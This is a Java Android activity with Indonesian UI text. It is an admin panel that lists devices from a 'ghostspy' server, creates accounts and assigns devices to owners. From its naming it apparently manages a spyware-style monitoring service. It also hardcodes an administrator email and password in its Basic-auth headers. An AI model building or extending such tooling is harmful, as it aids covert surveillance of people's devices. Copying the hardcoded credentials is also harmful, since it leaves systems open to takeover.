package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.os.Bundle;
import android.view.View;
import android.widget.*;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class AccountManageActivity extends Activity {
    private LinearLayout container;
    private static final String SERVER = "https://ghostspy.bruang.biz.id";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView scroll = new ScrollView(this);
        container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setPadding(24, 40, 24, 40);
        container.setBackgroundColor(0x00000000);
        scroll.addView(container);
        scroll.setBackground(getDrawable(R.drawable.bg_admin));
        setContentView(scroll);

        addTitle("👥 Manajemen Akun & Perangkat");

        // Tombol buat akun
        addButton("+ Buat Akun Baru", R.drawable.btn_admin, () -> showCreateDialog());
        addButton("🔄 Refresh", R.drawable.btn_outline_admin, () -> loadData());

        loadData();
    }

    private void addTitle(String text) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextColor(0xFFFFFFFF);
        tv.setTextSize(20);
        tv.setTypeface(null, android.graphics.Typeface.BOLD);
        tv.setPadding(0, 0, 0, 24);
        container.addView(tv);
    }

    private void addButton(String text, int drawableRes, Runnable action) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(0xFFFFFFFF);
        btn.setBackground(getDrawable(drawableRes));
        btn.setOnClickListener(v -> action.run());
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 56);
        lp.setMargins(0, 0, 0, 12);
        btn.setLayoutParams(lp);
        container.addView(btn);
    }

    private void loadData() {
        new Thread(() -> {
            try {
                // Ambil daftar perangkat
                URL url = new URL(SERVER + "/api/devices");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestProperty("Authorization", "Basic " + android.util.Base64.encodeToString(
                    "admin@ghostspy.com:admin123".getBytes(), android.util.Base64.NO_WRAP));
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                JSONArray devices = new JSONArray(sb.toString());
                runOnUiThread(() -> displayDevices(devices));
            } catch (Exception e) {
                runOnUiThread(() -> Toast.makeText(this, "Gagal memuat data", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    private void displayDevices(JSONArray devices) {
        // Hapus tampilan lama (kecuali judul & tombol)
        int childCount = container.getChildCount();
        for (int i = childCount - 1; i >= 2; i--) {
            container.removeViewAt(i);
        }

        for (int i = 0; i < devices.length(); i++) {
            try {
                JSONObject d = devices.getJSONObject(i);
                String deviceId = d.getString("id");
                String model = d.optString("model", "Unknown");
                String owner = d.optString("owner", "None");

                LinearLayout card = new LinearLayout(this);
                card.setOrientation(LinearLayout.VERTICAL);
                card.setBackground(getDrawable(R.drawable.card_admin));
                card.setPadding(16, 16, 16, 16);
                LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
                lp.setMargins(0, 0, 0, 8);
                card.setLayoutParams(lp);

                TextView idView = new TextView(this);
                idView.setText("📱 " + model + " (" + deviceId + ")");
                idView.setTextColor(0xFFFFFFFF);
                idView.setTextSize(14);

                TextView ownerView = new TextView(this);
                ownerView.setText("Owner: " + owner);
                ownerView.setTextColor(owner.equals("None") ? 0xFFFF1744 : 0xFF00E676);

                card.addView(idView);
                card.addView(ownerView);

                if (owner.equals("None")) {
                    Button assignBtn = new Button(this);
                    assignBtn.setText("Assign to User");
                    assignBtn.setTextColor(0xFFFFFFFF);
                    assignBtn.setBackground(getDrawable(R.drawable.btn_admin));
                    assignBtn.setOnClickListener(v -> showAssignDialog(deviceId));
                    card.addView(assignBtn);
                }

                container.addView(card);
            } catch (Exception e) {}
        }
    }

    private void showCreateDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Buat Akun Baru");
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(32, 16, 32, 16);
        EditText emailInput = new EditText(this); emailInput.setHint("Email");
        EditText passwordInput = new EditText(this); passwordInput.setHint("Password");
        layout.addView(emailInput);
        layout.addView(passwordInput);
        builder.setView(layout);
        builder.setPositiveButton("Buat", (d, w) -> {
            String email = emailInput.getText().toString().trim();
            String pass = passwordInput.getText().toString().trim();
            if (!email.isEmpty() && !pass.isEmpty()) {
                createUser(email, pass);
            }
        });
        builder.setNegativeButton("Batal", null);
        builder.show();
    }

    private void createUser(String email, String password) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER + "/api/admin/create-user");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Authorization", "Basic " + android.util.Base64.encodeToString(
                    "admin@ghostspy.com:admin123".getBytes(), android.util.Base64.NO_WRAP));
                conn.setDoOutput(true);
                JSONObject body = new JSONObject();
                body.put("email", email);
                body.put("password", password);
                OutputStream os = conn.getOutputStream();
                os.write(body.toString().getBytes());
                os.flush();
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                JSONObject res = new JSONObject(sb.toString());
                runOnUiThread(() -> Toast.makeText(this, res.optString("message"), Toast.LENGTH_SHORT).show());
            } catch (Exception e) {
                runOnUiThread(() -> Toast.makeText(this, "Gagal membuat akun", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    private void showAssignDialog(String deviceId) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Assign Device ke User");
        EditText emailInput = new EditText(this);
        emailInput.setHint("Email user");
        builder.setView(emailInput);
        builder.setPositiveButton("Assign", (d, w) -> {
            String email = emailInput.getText().toString().trim();
            if (!email.isEmpty()) {
                assignDevice(deviceId, email);
            }
        });
        builder.setNegativeButton("Batal", null);
        builder.show();
    }

    private void assignDevice(String deviceId, String email) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER + "/api/admin/assign-device");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Authorization", "Basic " + android.util.Base64.encodeToString(
                    "admin@ghostspy.com:admin123".getBytes(), android.util.Base64.NO_WRAP));
                conn.setDoOutput(true);
                JSONObject body = new JSONObject();
                body.put("device_id", deviceId);
                body.put("owner_email", email);
                OutputStream os = conn.getOutputStream();
                os.write(body.toString().getBytes());
                os.flush();
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                JSONObject res = new JSONObject(sb.toString());
                runOnUiThread(() -> {
                    Toast.makeText(this, res.optString("message"), Toast.LENGTH_SHORT).show();
                    loadData(); // Refresh
                });
            } catch (Exception e) {
                runOnUiThread(() -> Toast.makeText(this, "Gagal assign", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }
}
